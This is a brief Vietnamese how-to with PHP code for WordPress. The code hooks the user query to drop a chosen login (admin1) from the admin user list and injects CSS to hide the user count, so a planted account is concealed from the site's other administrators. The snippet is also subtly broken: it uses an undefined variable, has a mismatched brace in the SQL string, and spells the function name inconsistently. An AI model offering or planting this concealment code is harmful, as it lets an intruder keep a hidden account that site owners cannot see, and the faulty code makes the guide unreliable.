
#Hướng dẫn ẩn thành viên trong trang Admin của Wordpress
- Trước tiên, tạo user muốn ẩn ( Ví dụ user mình tạo là admin1, thì điền vào code dưới là admin ). Sau đó copy đoạn code dưới vào bất kỳ chỗ nào trong wordpress (function.php, *plugins,...).

add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
global $current_user;
if ($username == 'admin1') {
}
else{
global $wpdb;
$user_search->query_where = str_replace('WHERE 1=1',
 "WHERE 1=1 AND {$wpdb->users).user_login != 'admin1' ",$user_search->query_where);
}
}

function hide_useR_count(){
?>
<style>
.wp-admin.users-php span.count {display:none;}
</style>
<?php
}
add_action('admin_head','hide_user_count');
